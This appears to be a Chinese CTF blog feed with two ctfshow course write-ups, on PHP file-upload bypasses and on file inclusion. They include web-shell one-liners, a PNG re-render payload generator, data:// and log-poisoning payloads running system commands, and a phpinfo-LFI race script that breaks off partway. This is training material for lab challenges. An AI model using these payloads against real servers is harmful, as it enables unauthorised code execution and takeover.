      <link href="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86+wp/"/>
      <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86+wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow私教课第六节"><a href="#ctfshow私教课第六节" class="headerlink" title="ctfshow私教课第六节"></a>ctfshow私教课第六节</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>php的文件上传</p><p>在linux系统中，强制上传的文件会被放在&#x2F;tmp&#x2F;php??????的地方，使用匹配符的时候，就是&#x2F;???&#x2F;?????[@-[]来匹配</p><h4 id="ctfshow私教课web42（基础之双写绕过"><a href="#ctfshow私教课web42（基础之双写绕过" class="headerlink" title="ctfshow私教课web42（基础之双写绕过)"></a>ctfshow私教课web42（基础之双写绕过)</h4><p><img src="/img/sc1.jpg" alt="输入图片说明"></p><blockquote><p>经过尝试发现其将php替换为空，这里可以使用双写绕过<br><img src="/img/sc2.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>传入内容为一句话木马的图片，修改后缀为pphphp，上传后看到路径，使用蚁剑连接就可以拿到flag</p></blockquote><blockquote><p>也可以直接访问上传文件的路径，使用远程代码执行拿到flag</p></blockquote><p><img src="/img/sc3.jpg" alt="输入图片说明"></p><h2 id="php的文件上传绕过"><a href="#php的文件上传绕过" class="headerlink" title="php的文件上传绕过"></a>php的文件上传绕过</h2><h4 id="可以代替php的符号"><a href="#可以代替php的符号" class="headerlink" title="可以代替php的符号"></a>可以代替php的符号</h4><blockquote><p>php3   php5   phtml   phps</p></blockquote><h4 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1.双写绕过"></a>1.双写绕过</h4><blockquote><p>原理是后缀替换为空时，我们通过提交1.pphphp替换php为空后，得到1.php，就可以成功写入木马<br>但是当题目是将php替换为txt或者其他字符时，我们就没办法使用双写进行绕过了</p></blockquote><h4 id="2-php文件上传的00截断-古老"><a href="#2-php文件上传的00截断-古老" class="headerlink" title="2.php文件上传的00截断(古老)"></a>2.php文件上传的00截断(古老)</h4><blockquote><p>我们输入 hello world的时候，真正存储的是hello空格world\n\00<br>123.php 明显不让上传<br>123.php%00.jpg 那么后台判断的时候，取最后一个点后面的字符作为后缀.jpg看起来时合法的文件名称<br>到%00就会停止<br>.&#x2F;upload&#x2F;123.php%00.jpg  -&gt;  .&#x2F;upload&#x2F;123.php<br>这样的就进行了截断，就可以执行我们的恶意php代码<br>00字符截断需要的版本<br>php版本小于5.3.4<br>java版本小于7u40</p></blockquote><h4 id="3-iconv字符转换异常后造成了字符截断-古老"><a href="#3-iconv字符转换异常后造成了字符截断-古老" class="headerlink" title="3.iconv字符转换异常后造成了字符截断(古老)"></a>3.iconv字符转换异常后造成了字符截断(古老)</h4><blockquote><p>php在文件上传场景下的文件名字符集转换时，可能出现截断问题<br>utf-8字符集  默认的字符编码范围为0x00-0x7f<br>iconv 转换的字符不在上面这个范围之内，低版本的php会报异常，报了异常以后，后续字符不再处理，就会造成截断问题<br>123.php%df.jpg  -&gt;  123.php<br>这样的就进行了截断，就可以执行我们的恶意php代码<br>php版本低于5.4才可以使用</p></blockquote><h4 id="4-文件后缀是白名单的时候的绕过"><a href="#4-文件后缀是白名单的时候的绕过" class="headerlink" title="4.文件后缀是白名单的时候的绕过"></a>4.文件后缀是白名单的时候的绕过</h4><blockquote><p>白名单:只准上传这几个后缀  因为匹配的内容少，所以限制的范围就大<br>黑名单:不准上传这几个后缀    因为匹配的内容多，所以限制的范围就小</p></blockquote><h3 id="web服务器的解析漏洞"><a href="#web服务器的解析漏洞" class="headerlink" title="web服务器的解析漏洞"></a>web服务器的解析漏洞</h3><h4 id="1-apache-解析漏洞"><a href="#1-apache-解析漏洞" class="headerlink" title="1.apache 解析漏洞"></a>1.apache 解析漏洞</h4><blockquote><ul><li>多后缀解析漏洞（古老)<br>当我们上传apache不认识的后缀时，apache会继续往前找后缀，找到认识就解析执行<br>例如上传123.txt.ctfshow就会解析成123.txt文本文档<br>例如上传123.php.ctfshow就会解析成123.php交给中间件处理php脚本</li></ul></blockquote><blockquote><ul><li>ImageMagic组件白名单绕过<br>目标主机安装了这个漏洞版本的ImageMagic插件 &lt;&#x3D;3.3.0<br>在php.ini中启用了这个插件<br>通过了php new ImageMagic对象的方式来处理图片时且php版本大于5.4时<br>满足上面的条件才可以使用，上传特定的svg图片，来实现组件的缺陷导致任意代码执行</li></ul></blockquote><h4 id="2-nginx解析漏洞"><a href="#2-nginx解析漏洞" class="headerlink" title="2.nginx解析漏洞"></a>2.nginx解析漏洞</h4><blockquote><p>基于错误的nginx配置和php-fpm配置，当我们访问<br>cgi.fix_pathinfo默认开启 123.txt&#x2F;123.php  当123.php不存在时，会找&#x2F;前面的文件进行php解析，这时候，就成功解析了123.txt</p></blockquote><h4 id="ctfshow私教课web43-nginx解析漏洞）"><a href="#ctfshow私教课web43-nginx解析漏洞）" class="headerlink" title="ctfshow私教课web43(nginx解析漏洞）"></a>ctfshow私教课web43(nginx解析漏洞）</h4><p><img src="/img/sc4.jpg" alt="输入图片说明"></p><p><img src="/img/sc5.jpg" alt="输入图片说明"></p><blockquote><p>看到白名单只允许上传后缀为txt的文件，可以考虑nainx的解析漏洞，上传1.txt（这里用BP改后缀），然后访问1.txt&#x2F;1.php，它会首先找1.php但是找不到，就会找&#x2F;前面的1.txt进行php解析，就能够执行我们的一句话木马</p></blockquote><p><img src="/img/sc6.jpg" alt="输入图片说明"></p><p><img src="/img/sc7.jpg" alt="输入图片说明"></p><p>拿到flag</p><h4 id="3-iis解析漏洞"><a href="#3-iis解析漏洞" class="headerlink" title="3.iis解析漏洞"></a>3.iis解析漏洞</h4><blockquote><p>windows下使用 iis  iis6.0版本中，如果解析的目录名字为xxx.asp 那么里面的所有文件，都会按照asp来解析</p></blockquote><h3 id="高级文件绕过"><a href="#高级文件绕过" class="headerlink" title="高级文件绕过"></a>高级文件绕过</h3><h4 id="htaccess和nginx-htaccess"><a href="#htaccess和nginx-htaccess" class="headerlink" title=".htaccess和nginx.htaccess"></a>.htaccess和nginx.htaccess</h4><blockquote><p>如果存在上面的两个文件，写入就可以覆盖掉php.ini的内容</p></blockquote><blockquote><p>虚拟主机时代    一个物理服务器，里边存放着几十上百的网站，每个网站一个目录<br>每个网站需要的php.ini配置不同，不能共用一个，所以每个网站由可以自定义配置的文件，作用域仅限于自己目录，这个自定义的配置文件就是.htaccess和nginx.htaccess</p></blockquote><blockquote><p>在nginx下，默认使用.user.ini配置文件来进行php的配置</p></blockquote><h4 id="ctfshow私教课web44-user-ini"><a href="#ctfshow私教课web44-user-ini" class="headerlink" title="ctfshow私教课web44(.user.ini)"></a>ctfshow私教课web44(.user.ini)</h4><p><img src="/img/sc8.jpg" alt="输入图片说明"></p><blockquote><p>首先我们需要创造两个文件，.user,ini指向123.txt，在123.txt里写一句话木马，将两个文件上传就可以执行里面的一句话木马拿到flag<img src="/img/sc9.jpg" alt="输入图片说明"><img src="/img/sc10.jpg" alt="输入图片说明"><br><img src="/img/sc11.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里远程代码执行的时候，在原页面输入，不用再访问123.txt或者&#x2F;user.ini</p></blockquote><h4 id="服务端内容检测"><a href="#服务端内容检测" class="headerlink" title="服务端内容检测"></a>服务端内容检测</h4><blockquote><p>不局限于检测文件名，还会检测文件的后缀，文件的内容<br>例如检测到&lt;?php,system,eval,$_POST就不让上传等等</p></blockquote><h4 id="ctfshow私教课web45-内容检测"><a href="#ctfshow私教课web45-内容检测" class="headerlink" title="ctfshow私教课web45(内容检测)"></a>ctfshow私教课web45(内容检测)</h4><p><img src="/img/sc12.jpg" alt="输入图片说明"></p><blockquote><p>然后我们需要一个一个检测时哪个内容非法，经过尝试后，二分法确定出被检测的关键字，使用替代语法绕过，发现限制了php,POST,GET,?&gt;<br>php可以使用短标签进行绕过<br>POST,GET可以使用REQUEST来代替，这里也可以使用COOKIE，然后在COOKIE里写入内容，就可以执行远程代码<br>?&gt;这里是一个特性，最后一行，;和?&gt;存在一个或者两个都存在就可以<img src="/img/sc13.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这是使用COOKIE的做法<img src="/img/sc14.jpg" alt="输入图片说明"></p></blockquote><h4 id="配合伪协议进行绕过-配合日志包含绕过"><a href="#配合伪协议进行绕过-配合日志包含绕过" class="headerlink" title="配合伪协议进行绕过+配合日志包含绕过"></a>配合伪协议进行绕过+配合日志包含绕过</h4><h4 id="ctfshow私教课web46-php伪协议文件上传-日志包含"><a href="#ctfshow私教课web46-php伪协议文件上传-日志包含" class="headerlink" title="ctfshow私教课web46(php伪协议文件上传+日志包含)"></a>ctfshow私教课web46(php伪协议文件上传+日志包含)</h4><blockquote><p>首先将.user.ini文件的内容修改为php:&#x2F;&#x2F;input伪协议，上传.user.ini,访问原页，使用BP抓包，写入php代码拿到flag<br><img src="/img/sc15.jpg" alt="输入图片说明"><br><img src="/img/sc16.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里也可以使用日志包含进行解题,将.user.ini的内容写入&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log上传后写入一句话木马，就可以进行rce拿到flag<br><img src="/img/sc17.jpg" alt="输入图片说明"><br><img src="/img/sc18.jpg" alt="输入图片说明"></p></blockquote><h4 id="getimagesize函数绕过"><a href="#getimagesize函数绕过" class="headerlink" title="getimagesize函数绕过"></a>getimagesize函数绕过</h4><blockquote><p>getimagesize函数来检测是不是图片，而不采取其他措施的情况下，如果一旦绕过getimagesize函数，就可以实现任意文件上传<br>XBM格式图片<br>读到#define %s %d这些格式，就认为是XBM图片的高或者宽<br>%s要写width或者height<br>%d要写数字</p></blockquote><h4 id="ctfshow私教课web48-绕过getimagesize函数"><a href="#ctfshow私教课web48-绕过getimagesize函数" class="headerlink" title="ctfshow私教课web48(绕过getimagesize函数)"></a>ctfshow私教课web48(绕过getimagesize函数)</h4><blockquote><p>标准特征为<img src="/img/sc19.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们将.user.ini的内容加上定义的注释，伪装成图片进行绕过，这里用的是日志包含，也可以用php伪协议，感兴趣的可以自行尝试<br><img src="/img/sc20.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>上传后进行正常的日志包含就可以拿到flag<img src="/img/sc21.jpg" alt="输入图片说明"></p></blockquote><h4 id="png二次渲染绕过"><a href="#png二次渲染绕过" class="headerlink" title="png二次渲染绕过"></a>png二次渲染绕过</h4><p>正常做法: move_uploaded_file   方式移动我们上传的临时文件到上传目录去</p><p>二次渲染做法: 通过imagepng方法来，来动态的二次生成一个png图片，里面的php代码就会被清洗掉<br>所以，我们需要使用特殊的方式，来构造我们的图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line"><span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line"><span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>);<span class="variable">$y</span>+=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line"><span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>); <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这是修改png图片路径，写入一句话木马的php代码，在使用前需要先将文件夹中的.user.ini删除，没有的话，照常进行就可以，并且创造一个2.png(或者其他代码中的图片名，修改即可),然后在本地的php环境中访问这段代码，例如127.0.0.1&#x2F;png_creater.php，就可以自动写入<br><img src="/img/sc22.jpg" alt="输入图片说明"><br>显示空白是正常的，如果报错就是不正常的，就是没写入</p></blockquote><h4 id="ctfshow私教课web50-png二次渲染绕过"><a href="#ctfshow私教课web50-png二次渲染绕过" class="headerlink" title="ctfshow私教课web50(png二次渲染绕过)"></a>ctfshow私教课web50(png二次渲染绕过)</h4><blockquote><p>上传文件测试后，仍然出现这个<br><img src="/img/sc23.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>使用绕过getimagesize的时候发现只允许上传png图片，考虑使用png二次渲染绕过<br><img src="/img/sc24.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们使用上面方法构造的png图片上传<br><img src="/img/sc25.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们在图片中写入的一句话木马为<?$_GET[0]($_POST[1]);?>这里用0的代表system等函数，1就是要执行的命令，0使用GET传参，1使用POST传参</p></blockquote><p>这里首先查看这张图片，然后使用BP进行抓包</p><p><img src="/img/sc26.jpg" alt="输入图片说明"></p><blockquote><p>抓包后，修改请求方式为POST，将原本图片中的信息复制到POST的后面view.php?image&#x3D;3e35563210f995ee79a073fa882e1fd6.png&amp;0&#x3D;system，这后面的&amp;0&#x3D;system就是使用方法，再在BP中输入1&#x3D;tac &#x2F;*发送后，我们就拿到了flag<br><img src="/img/sc27.jpg" alt="输入图片说明"></p></blockquote><h4 id="jpg二次渲染绕过"><a href="#jpg二次渲染绕过" class="headerlink" title="jpg二次渲染绕过"></a>jpg二次渲染绕过</h4><blockquote><p>使用专用图来生成jpg木马，实现经过二次渲染后，我们的恶意代码依然能够保留在图片中，通过文件包含执行里面的php代码，参考png二次渲染</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高级文件包含+wp</title>
      <link href="/2025/01/21/%E9%AB%98%E7%BA%A7%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+wp/"/>
      <url>/2025/01/21/%E9%AB%98%E7%BA%A7%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow私教课第五节"><a href="#ctfshow私教课第五节" class="headerlink" title="ctfshow私教课第五节"></a>ctfshow私教课第五节</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;</p><blockquote><ol><li>文件名可控<br>$file&#x3D;$_GET[‘file’];<br>include $file.”.php”;<br>对于我们提交的任何东西后面加一个.php，使用php伪协议，可以使用data协议,ctfshow私教课web35使用的是?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system("tac /*");?>拿到的flag</li></ol></blockquote><blockquote><ol start="2"><li>文件后缀可控<br>$file&#x3D;$_GET[‘file’];<br>include “&#x2F;var&#x2F;www&#x2F;html&#x2F;“.$file;  &#x2F;&#x2F;不能使用伪协议了，伪协议需要前面的固定格式<br>这时候只能使用虚拟目录或者其他的目录跳转<br>例如 &#x2F;var&#x2F;www&#x2F;html..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php,就可以包含进去了</li></ol></blockquote><h3 id="高级文件包含"><a href="#高级文件包含" class="headerlink" title="高级文件包含"></a>高级文件包含</h3><h4 id="1-nginx日志文件包含"><a href="#1-nginx日志文件包含" class="headerlink" title="1.nginx日志文件包含"></a>1.nginx日志文件包含</h4><p>nginx可以认为它是http的一个服务器软件，提供了http服务，默认监听80端口</p><p><a href="http://localhost/123.php?a=b">http://localhost/123.php?a=b</a><br>nginx会首先判断123.php是否是.php后缀，如果是，它就会进行一次转发，转发到本地的127.0.0.1的9000端口</p><p>9000端口，是被另一个服务器软件监听，它提供解析php文件的服务，我们把这个软件，叫做php-fpm</p><p>专门解析php后缀的文件，执行里面的代码，将执行结果交回nginx，再由nginx返回给http的客户端，这个客户端就是浏览器</p><p>如果解析出来是<a href="http://localhost/123.jpg">http://localhost/123.jpg</a><br>123.jpg 非php后缀，那么由自己处理，nginx会找到web目录，读取123.jpg的内容并返回给浏览器，并同时告诉浏览器，我返回的文件内容是一个jpg图片，你按照图片模式进行渲染，于是，浏览器页面上就能显示出一张图片出来<br>这也就是 动静态分离</p><p><img src="/img/baohan13.jpg" alt="输入图片说明"></p><blockquote><p>对于nginx我们除了客户端的一个信息，我们什么也控制不了，就像图中我们修改User-Agent为CTFshow,再上传时，日志的客户端信息就变成了CTFshow</p></blockquote><blockquote><p>即使我们访问一个不存在的文件，日志中也是能看到的，并且携带着我们修改之后的服务端信息<img src="/img/baohan14.jpg" alt="输入图片说明"><img src="/img/baohan15.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们尝试传入phpinfo()看看，在客户端信息和访问文件上都写上</p></blockquote><p><img src="/img/baohan16.jpg" alt="输入图片说明"></p><blockquote></blockquote><p><img src="/img/baohan17.jpg" alt="输入图片说明"></p><blockquote><p>这里通过访问文件弄上去的已经自动经过url编码了，已经无法被认作php代码执行了在这里，但是我们通过修改服务器信息上传上去的php代码仍旧保持原来的模样，可以被认为是php代码执行</p></blockquote><h4 id="ctfshow私教课web37-nginx日志"><a href="#ctfshow私教课web37-nginx日志" class="headerlink" title="ctfshow私教课web37 (nginx日志)"></a>ctfshow私教课web37 (nginx日志)</h4> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);         </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;file:///var/www/html/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];         </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/baohan18.jpg" alt="输入图片说明"></p><blockquote><p>在nginx下，日志的默认存储路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，我们访问这个路径就能看到日志<br>我们可以利用这个来看到我们通过修改服务器信息上传的恶意php代码的执行结果<br>注意修改后的服务器信息，也就是php恶意代码需要一次性写对，不然会破坏环境，会出现致命错误，后面的东西就没办法执行下去了，就只能重新打开环境了</p></blockquote><blockquote><p>此题首先上传修改后的服务器信息也就是php的一句话木马，借助一句话木马进行我们的操作</p></blockquote><blockquote><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;的作用是上溯，这样我们就能看到我们已知的任意路径内的内容<br>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log根据nginx的默认路径读取日志<br>1&#x3D;system(“tac &#x2F;f1ag”）；借助一句话木马执行我们的系统命令拿到flag</p></blockquote><h4 id="日志包含的前提条件"><a href="#日志包含的前提条件" class="headerlink" title="日志包含的前提条件"></a>日志包含的前提条件</h4><ol><li>有文件名可控的文件包含点</li></ol><p> 像前面后缀强制添加.php的就没办法使用日志包含</p><ol start="2"><li>有可以访问到的日志路径  默认nainx的日志路径为 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>  如果路径被改了，就无法使用日志包含了</li></ol><h4 id="2-临时文件包含"><a href="#2-临时文件包含" class="headerlink" title="2. 临时文件包含"></a>2. 临时文件包含</h4><ul><li>这个方法跑出来需要时间很长，而且跑不跑出来都是看运气</li></ul><p>在之前遇到的，在linux系统，如果我们强制上传文件的话，文件会被存储在默认路径下<br>默认路径为&#x2F;tmp&#x2F;php??????</p><p>文件包含，不能包含&#x2F;???&#x2F;????????[@-[]</p><p>原因是文件包含不支持通配符</p><p>我们要得到，明确的临时目录下php开头的随机文件的文件名字全称，才能够使用文件包含</p><p>默认情况下，生命周期与php脚本一致，在脚本运行过程中，存在，脚本运行结束后，临时文件会被自动删除</p><p>突破点</p><ol><li>在php脚本运行过程中，包含临时文件</li><li>在脚本运行过程中，得到完整的临时文件包含</li></ol><p>满足这两个条件，我们才能使用这个临时文件包含</p><p>php配置文件中，默认，每次向浏览器发送内容时，不是一个字符一个字符发送的，它是一块内容一块内容发送的，每4096个字符发送一次。<br>我们可以不断地上传，使得字符数超过4096个字符，让它分多次进行发送，从而减慢它的发送速度，是使得在结束之前，我们能够找到临时文件的地址，然后立刻进行文件包含</p><p>假设我们能够访问phpinfo的结果  FILES就会存在tmp_name临时文件名字，读取后可以成功文件包含</p><p>专业术语叫 phpinfo_lfi</p><h4 id="ctfshow私教课web38-临时文件包含"><a href="#ctfshow私教课web38-临时文件包含" class="headerlink" title="ctfshow私教课web38  (临时文件包含)"></a>ctfshow私教课web38  (临时文件包含)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);         </span><br><span class="line"><span class="comment">//phpinfo.php   </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;file:///var/www/html/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];         </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>附上攻击脚本<br>这个脚本比较老，需要使用python27运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span 